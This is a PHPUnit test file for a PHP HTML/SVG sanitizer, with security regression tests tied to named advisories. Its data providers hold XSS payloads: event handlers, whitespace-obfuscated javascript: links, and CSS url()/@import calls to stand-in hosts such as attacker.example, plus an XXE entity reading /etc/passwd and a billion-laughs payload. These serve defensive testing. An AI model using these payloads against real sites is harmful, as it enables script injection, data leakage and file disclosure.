<?php declare(strict_types=1);

namespace Rhukster\DomSanitizer;

use PHPUnit\Framework\TestCase;

final class DomSanitizerTest extends TestCase
{
    public function testDomSanitizerInstance(): void
    {
        $instance = new DOMSanitizer();
        $this->assertInstanceOf(
            DomSanitizer::class,
            $instance
        );
    }

    public function testCompromisedHTML(): void
    {
        $bad_html = file_get_contents('./tests/bad_full.html');
        $good_html = file_get_contents('./tests/good_full.html');
        $sanitizer = new DOMSanitizer(DOMSanitizer::HTML);

        $cleaned = $sanitizer->sanitize($bad_html, [
            'remove-html-tags' => false,
        ]);

        $this->assertEqualHtml(
            $good_html,
            $cleaned
        );
    }

    public function testHTMLSnippet(): void
    {
        $sanitizer = new DOMSanitizer();

        $input = '<div><p class="foo" onclick="alert(\'danger\');">bar</p><script>alert(\'more danger\')</script></div>';
        $expected = '<div><p class="foo">bar</p></div>';

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );
    }

    public function testCompromisedSVG(): void
    {
        $bad_svg = file_get_contents('./tests/bad.svg');
        $good_svg = file_get_contents('./tests/good.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $output = $sanitizer->sanitize($bad_svg,  [
            'compress-output' => false
        ]);

        $this->assertEqualHtml(
            $good_svg,
            $output
        );
    }

    public function testGoodMathML(): void{
        $input = $expected = file_get_contents('./tests/mathml-sample.xml');
        $sanitizer = new DOMSanitizer(DOMSanitizer::MATHML);

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );
    }

    public function testCustomTags(): void
    {
        $sanitizer = new DOMSanitizer();

        $input = '<div><foo>testing</foo></div>';
        $expected = '<div></div>';

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );

        $expected2 = '<div><foo>testing</foo></div>';
        $sanitizer->addAllowedTags(['foo']);

        $this->assertEqualHTML(
            $expected2,
            $sanitizer->sanitize($input)
        );

        $expected3 = '<div></div>';
        $sanitizer->addDisallowedTags(['foo']);

        $this->assertEqualHTML(
            $expected3,
            $sanitizer->sanitize($input)
        );
    }

    public function testInvalidSVG(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $this->assertEquals(
            false,
            $sanitizer->sanitize('<foo></foo>')
        );
    }

    public function testCustomAttributes(): void
    {
        $sanitizer = new DOMSanitizer();

        $input = '<div><p blah="something">testing</p></div>';
        $expected = '<div><p>testing</p></div>';

        $this->assertEqualHTML(
            $expected,
            $sanitizer->sanitize($input)
        );

        $expected2 = '<div><p blah="something">testing</p></div>';
        $sanitizer->addAllowedAttributes(['blah']);

        $this->assertEqualHTML(
            $expected2,
            $sanitizer->sanitize($input)
        );

        $expected3 = '<div><p>testing</p></div>';
        $sanitizer->addDisallowedAttributes(['blah']);

        $this->assertEqualHTML(
            $expected3,
            $sanitizer->sanitize($input)
        );
    }

    public function testCaseSensitivity(): void{
        $bad_svg = file_get_contents('./tests/cartman.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $this->assertStringContainsString(
            'viewBox',
            $sanitizer->sanitize($bad_svg, [
                'compress-output' => false
            ])
        );
    }

    public function testXss(): void {
        $bad_svg = file_get_contents('./tests/xss.svg');
        $good_svg = file_get_contents('./tests/xss_expected.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $output = $sanitizer->sanitize($bad_svg,  [
            'compress-output' => false
        ]);

        $this->assertEqualHtml(
            $good_svg,
            $output
        );
    }

    public function testXlinkHRef(): void {
        $bad_svg = file_get_contents(__DIR__ . '/xlink.svg');
        $good_svg = file_get_contents(__DIR__ . '/xlink_expected.svg');
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $sanitizer->addDisallowedAttributes(['xlink:href']);

        $output = $sanitizer->sanitize($bad_svg,  [
            'compress-output' => false
        ]);

        $this->assertEqualHtml(
            $good_svg,
            $output
        );
    }

    // =========================================================================
    // GHSA-gxwg-x2jg-q44j: Stored XSS via SVG Event Handlers
    // Tests for event handler attributes that should be stripped
    // =========================================================================

    /**
     * @dataProvider providerSvgEventHandlers
     */
    public function testSvgEventHandlersStripped(string $input, string $expected, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($input);

        $this->assertEqualHtml($expected, $output, "Failed: $description");
    }

    public static function providerSvgEventHandlers(): array
    {
        return [
            // GHSA-gxwg-x2jg-q44j PoC vectors
            [
                '<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"/>',
                'SVG onload attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"></animate></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"/>',
                'animate tag should be removed entirely (disallowed tag)'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)" attributeName="x"></set></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"/>',
                'set tag should be removed entirely (disallowed tag)'
            ],

            // Common event handlers on allowed tags
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onerror="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onerror attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onmouseover attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onclick attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onfocus="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onfocus attribute should be stripped'
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect onblur="alert(1)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'onblur attribute should be stripped'
            ],

            // Multiple event handlers
            [
                '<svg onload="alert(1)" onclick="alert(2)" xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(3)"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
                'Multiple event handlers should all be stripped'
            ],

            // Mixed with valid attributes
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" onload="alert(1)" width="100" height="100"/></svg>',
                '<svg xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" width="100" height="100"/></svg>',
                'Event handler stripped while valid attributes preserved'
            ],
        ];
    }

    /**
     * @dataProvider providerHtmlEventHandlers
     */
    public function testHtmlEventHandlersStripped(string $input, string $expected, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::HTML);
        $output = $sanitizer->sanitize($input);

        $this->assertEqualHtml($expected, $output, "Failed: $description");
    }

    public static function providerHtmlEventHandlers(): array
    {
        return [
            // GHSA-gxwg-x2jg-q44j PoC vectors (HTML context)
            [
                '<img src="x" onerror="alert(1)">',
                '<img src="x">',
                'img onerror should be stripped'
            ],
            [
                '<video src="x" onerror="alert(1)"></video>',
                '<video src="x"></video>',
                'video onerror should be stripped'
            ],
            [
                '<audio src="x" onerror="alert(1)"></audio>',
                '<audio src="x"></audio>',
                'audio onerror should be stripped'
            ],
            [
                '<div onload="alert(1)">test</div>',
                '<div>test</div>',
                'div onload should be stripped'
            ],
            [
                '<div onmouseover="alert(1)">test</div>',
                '<div>test</div>',
                'div onmouseover should be stripped'
            ],
            [
                '<a href="#" onclick="alert(1)">link</a>',
                '<a href="#">link</a>',
                'anchor onclick should be stripped'
            ],
            [
                '<input onfocus="alert(1)" type="text">',
                '<input type="text">',
                'input onfocus should be stripped'
            ],
            [
                '<form onsubmit="alert(1)"></form>',
                '<form></form>',
                'form onsubmit should be stripped'
            ],

            // Script tags should be removed entirely
            [
                '<div><script>alert(1)</script></div>',
                '<div></div>',
                'script tags should be removed'
            ],
        ];
    }

    /**
     * Test that disallowed SVG tags are completely removed
     */
    public function testDisallowedSvgTags(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $disallowedTags = ['animate', 'set', 'script', 'foreignobject', 'use'];

        foreach ($disallowedTags as $tag) {
            $input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><{$tag}></{$tag}></svg>";
            $output = $sanitizer->sanitize($input);

            $this->assertStringNotContainsString(
                "<{$tag}",
                strtolower($output),
                "Disallowed tag '{$tag}' should be removed"
            );
        }
    }

    // =========================================================================
    // Issue #5: SVG filter elements incorrectly removed due to camelCase
    // =========================================================================

    public function testSvgFiltersPreserved(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $input = '<svg xmlns="http://www.w3.org/2000/svg"><defs><filter id="blur"><feGaussianBlur stdDeviation="5"/></filter></defs><rect filter="url(#blur)" x="0" y="0" width="100" height="100"/></svg>';
        $output = $sanitizer->sanitize($input, ['compress-output' => false]);

        $this->assertStringContainsString(
            'feGaussianBlur',
            $output,
            'SVG filter elements like feGaussianBlur should be preserved'
        );
    }

    /**
     * @dataProvider providerSvgFilterTags
     */
    public function testSvgFilterTagsAllowed(string $tag, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><filter id=\"f\"><{$tag}/></filter></defs></svg>";
        $output = $sanitizer->sanitize($input, ['compress-output' => false]);

        $this->assertStringContainsString(
            $tag,
            $output,
            "SVG filter tag '{$tag}' should be allowed: $description"
        );
    }

    public static function providerSvgFilterTags(): array
    {
        return [
            ['feGaussianBlur', 'Gaussian blur filter'],
            ['feBlend', 'Blend filter'],
            ['feColorMatrix', 'Color matrix filter'],
            ['feOffset', 'Offset filter'],
            ['feMerge', 'Merge filter'],
            ['feMergeNode', 'Merge node filter'],
            ['feFlood', 'Flood filter'],
            ['feComposite', 'Composite filter'],
        ];
    }

    // =========================================================================
    // Issue #6: SVG Sanitizer Bypass via ASCII Whitespace Entities
    // (CVE-2026-33172 fix bypass)
    // =========================================================================

    /**
     * @dataProvider providerWhitespaceEntityBypass
     */
    public function testWhitespaceEntityBypassBlocked(string $input, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($input);

        $this->assertStringNotContainsString(
            'javascript',
            strtolower(preg_replace('/[\x00-\x20]+/', '', $output)),
            "Failed: $description"
        );
    }

    public static function providerWhitespaceEntityBypass(): array
    {
        return [
            // Tab bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x09;script:alert(1)"><text>Click</text></a></svg>',
                'href with tab entity (&#x09;) in javascript: should be stripped'
            ],
            // Newline bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x0a;script:alert(2)"><text>Click</text></a></svg>',
                'href with newline entity (&#x0a;) in javascript: should be stripped'
            ],
            // Carriage return bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x0d;script:alert(3)"><text>Click</text></a></svg>',
                'href with CR entity (&#x0d;) in javascript: should be stripped'
            ],
            // Leading tab bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="&#x09;javascript:alert(4)"><text>Click</text></a></svg>',
                'href with leading tab entity before javascript: should be stripped'
            ],
            // xlink:href bypass
            [
                '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="java&#x09;script:alert(5)"><text>Click</text></a></svg>',
                'xlink:href with tab entity in javascript: should be stripped'
            ],
            // Multiple whitespace characters
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="j&#x09;a&#x0a;v&#x0d;ascript:alert(6)"><text>Click</text></a></svg>',
                'href with multiple whitespace entities scattered in javascript: should be stripped'
            ],
            // Null byte bypass attempt
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#x00;script:alert(7)"><text>Click</text></a></svg>',
                'href with null byte entity in javascript: should be stripped'
            ],
        ];
    }

    // =========================================================================
    // GHSA-93vf-569f-22cq: CSS injection via <style> text content
    // =========================================================================

    /**
     * @dataProvider providerDangerousStyleContent
     */
    public function testDangerousStyleContentStripped(int $mode, string $input, string $description): void
    {
        $sanitizer = new DOMSanitizer($mode);
        $output = $sanitizer->sanitize($input);

        $this->assertStringNotContainsString('attacker.example', $output, "Failed: $description");
        $this->assertStringNotContainsString('evil.example', $output, "Failed: $description");
        $this->assertStringNotContainsString('@import', $output, "Failed: $description");
    }

    public static function providerDangerousStyleContent(): array
    {
        return [
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url("https://attacker.example/c"); }</style></svg>',
                'SVG <style> with quoted external url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url(https://attacker.example/c); }</style></svg>',
                'SVG <style> with unquoted external url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://attacker.example/evil.css);</style></svg>',
                'SVG <style> with @import url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>@import "https://attacker.example/evil.css";</style></svg>',
                'SVG <style> with quoted @import should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>body { background: url(//evil.example/x); }</style></svg>',
                'SVG <style> with protocol-relative url() should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: \75 rl(https://attacker.example/x); }</style></svg>',
                'SVG <style> with CSS hex-escape bypass should be dropped',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>\40 import url(https://evil.example/e.css);</style></svg>',
                'SVG <style> with CSS hex-escaped @import should be dropped',
            ],
            [
                DOMSanitizer::HTML,
                '<div><style>body { background: url(https://attacker.example/x); }</style></div>',
                'HTML <style> with external url() should be dropped',
            ],
        ];
    }

    // =========================================================================
    // GHSA-jfrr-ch68-f2w9: same CSS injection via the inline `style` ATTRIBUTE.
    // The <style> element was covered by GHSA-93vf-569f-22cq; the attribute
    // path only had the quote-requiring EXTERNAL_URL regex, so every payload
    // below was blocked as element text and waved through as an attribute.
    // =========================================================================

    /**
     * @dataProvider providerDangerousStyleAttribute
     */
    public function testDangerousStyleAttributeStripped(int $mode, string $input, string $description): void
    {
        $sanitizer = new DOMSanitizer($mode);
        $output = $sanitizer->sanitize($input);

        $this->assertStringNotContainsString('evil.example', $output, "Failed: $description");
        $this->assertStringNotContainsString('@import', $output, "Failed: $description");
        $this->assertStringNotContainsString('expression(', $output, "Failed: $description");
        $this->assertStringNotContainsString('data:', $output, "Failed: $description");
    }

    public static function providerDangerousStyleAttribute(): array
    {
        return [
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url(//evil.example/x)"/></svg>',
                'style attr with unquoted protocol-relative url() (the reported vector)',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url(https://evil.example/x)"/></svg>',
                'style attr with unquoted https url()',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: URL(//evil.example/x)"/></svg>',
                'style attr with uppercase URL()',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url (//evil.example/x)"/></svg>',
                'style attr with whitespace before the paren',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url(\\68 ttps://evil.example/x)"/></svg>',
                'style attr with CSS hex-escaped scheme',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url(\\2f\\2f evil.example/x)"/></svg>',
                'style attr with CSS hex-escaped slashes',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="@import url(//evil.example/x)"/></svg>',
                'style attr with @import',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="width: expression(alert(1))"/></svg>',
                'style attr with expression()',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url(&quot;data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=&quot;)"/></svg>',
                'style attr with data: url(), which slipped through even quoted',
            ],
            [
                DOMSanitizer::HTML,
                '<div style="background: url(//evil.example/x)"></div>',
                'HTML style attr with unquoted protocol-relative url()',
            ],
        ];
    }

    // =========================================================================
    // GHSA-ww22-4mqv-x5w3: the dangerous-token checks ran against the raw
    // declaration, so a CSS comment dropped inside a token split the value the
    // checks were looking for. image-set() was missed entirely, because it
    // loads a resource without ever writing url().
    // =========================================================================

    /**
     * @dataProvider providerCommentObfuscatedStyle
     */
    public function testCommentObfuscatedStyleStripped(int $mode, string $input, string $description): void
    {
        $sanitizer = new DOMSanitizer($mode);
        $output = $sanitizer->sanitize($input);

        $this->assertStringNotContainsString('evil.example', $output, "Failed: $description");
    }

    public static function providerCommentObfuscatedStyle(): array
    {
        return [
            [
                DOMSanitizer::HTML,
                '<div style="background:u/**/rl(https://evil.example/x)"></div>',
                'comment splitting the url token (the reported vector)',
            ],
            [
                DOMSanitizer::HTML,
                '<div style="background:url(/*x*/https://evil.example/x)"></div>',
                'comment between the paren and the scheme',
            ],
            [
                DOMSanitizer::HTML,
                '<div style="background:url(htt/**/ps://evil.example/x)"></div>',
                'comment splitting the scheme itself',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><style>rect{background:@im/**/port url(https://evil.example/x)}</style></svg>',
                'comment splitting @import in a style element',
            ],
            [
                DOMSanitizer::HTML,
                '<div style="background:url(\\2f\\2a x\\2a\\2f &quot;https://evil.example/x&quot;)"></div>',
                'escape sequence that decodes into a comment, which needs the second strip',
            ],
            [
                DOMSanitizer::HTML,
                '<div style="background-image:image-set(&quot;https://evil.example/x&quot; 1x)"></div>',
                'image-set() with an external url and no url() anywhere',
            ],
            [
                DOMSanitizer::HTML,
                '<div style="background-image:-webkit-image-set(&quot;https://evil.example/x&quot; 1x)"></div>',
                'prefixed -webkit-image-set()',
            ],
            [
                DOMSanitizer::SVG,
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="background-image:image-set(&quot;//evil.example/x&quot; 1x)"/></svg>',
                'image-set() with a protocol-relative url',
            ],
        ];
    }

    /**
     * Normalizing CSS must not start rejecting legitimate declarations:
     * relative image-set() references and commented but harmless CSS survive.
     */
    public function testBenignCommentedAndImageSetCssPreserved(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::HTML);

        $output = $sanitizer->sanitize('<div style="background-image:image-set(&quot;cat.png&quot; 1x, &quot;cat2.png&quot; 2x)"></div>');
        $this->assertStringContainsString('cat.png', $output, 'relative image-set() must survive');

        $output = $sanitizer->sanitize('<div style="/* brand colour */ color:red"></div>');
        $this->assertStringContainsString('color:red', $output, 'a declaration carrying a comment must survive');
    }

    /**
     * The fix must not strip legitimate CSS: same-document fragment references
     * and ordinary declarations have to survive.
     *
     * @dataProvider providerBenignStyleAttribute
     */
    public function testBenignStyleAttributePreserved(string $input, string $expected_fragment, string $description): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($input);

        $this->assertStringContainsString($expected_fragment, $output, "Failed: $description");
    }

    public static function providerBenignStyleAttribute(): array
    {
        return [
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: url(#grad)"/></svg>',
                'url(#grad)',
                'fragment reference must be preserved',
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill: red"/></svg>',
                'fill: red',
                'plain declaration must be preserved',
            ],
            [
                '<svg xmlns="http://www.w3.org/2000/svg"><rect style="stroke-width: 2; opacity: 0.5"/></svg>',
                'stroke-width: 2',
                'multiple plain declarations must be preserved',
            ],
        ];
    }

    /**
     * Legitimate <style> content must survive sanitization, including
     * fragment-only url(#id) references used by SVG defs/gradients/filters.
     */
    public function testLegitimateStyleContentPreserved(): void
    {
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);

        $fragment = '<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><style>.cls { fill: url(#g); stroke: #000; }</style><rect class="cls"/></svg>';
        $output = $sanitizer->sanitize($fragment);
        $this->assertStringContainsString('<style>', $output, 'Fragment url(#id) style block must be preserved');
        $this->assertStringContainsString('url(#g)', $output, 'Fragment reference must be preserved');

        $plain = '<svg xmlns="http://www.w3.org/2000/svg"><style>.a { fill: red; stroke: #00f; font-family: sans-serif; }</style><rect class="a"/></svg>';
        $output = $sanitizer->sanitize($plain);
        $this->assertStringContainsString('<style>', $output, 'Plain style rules must be preserved');
        $this->assertStringContainsString('fill: red', $output, 'Plain style rules must be preserved');

        $htmlSanitizer = new DOMSanitizer(DOMSanitizer::HTML);
        $html = '<div><style>.foo { color: red; }</style><p>ok</p></div>';
        $output = $htmlSanitizer->sanitize($html);
        $this->assertStringContainsString('<style>', $output, 'HTML plain style rules must be preserved');
        $this->assertStringContainsString('color: red', $output, 'HTML plain style rules must be preserved');
    }

    /**
     * GHSA-3446-6mgw-f79p (filed against Grav, exploits SVG upload via this
     * library): an attacker-uploaded SVG containing a DOCTYPE with an external
     * `SYSTEM` entity must NOT cause file disclosure. We assert that the
     * sanitizer (a) doesn't expand the entity into the output and (b) doesn't
     * issue a network request for the bogus URL — both achieved by stripping
     * DOCTYPE/ENTITY before parse and passing LIBXML_NONET.
     */
    public function testSVGXxeFileDisclosurePayloadIsNeutralized(): void
    {
        $payload = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>
XML;
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($payload);

        $this->assertStringNotContainsString('root:x:', $output, 'must not expand &xxe; into /etc/passwd contents');
        $this->assertStringNotContainsString('<!DOCTYPE', $output, 'DOCTYPE must be stripped');
        $this->assertStringNotContainsString('<!ENTITY', $output, 'ENTITY declarations must be stripped');
        $this->assertStringNotContainsString('SYSTEM', $output, 'SYSTEM keyword must be stripped');
    }

    public function testSVGXxeBillionLaughsPayloadIsNeutralized(): void
    {
        // Classic billion-laughs DoS — entity nesting that would expand
        // exponentially if the parser substituted entities. With our DOCTYPE
        // strip the declarations are gone before libxml sees them.
        $payload = <<<XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&lol3;</text></svg>
XML;
        $sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
        $output = $sanitizer->sanitize($payload);

        // Output must remain bounded — far less than the 1000+ chars an
        // expansion would produce.
        $this->assertLessThan(500, strlen($output), 'output must not balloon from entity expansion');
        $this->assertStringNotContainsString('lollollollol', $output, 'entities must not have expanded');
    }

    protected function assertEqualHtml($expected, $actual, $message = '')
    {
        $from = ['/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s', '/> </s'];
        $to   = ['>', '<', '\\1', '><'];
        $this->assertEquals(
            preg_replace($from, $to, $expected),
            preg_replace($from, $to, $actual)
        );
    }
}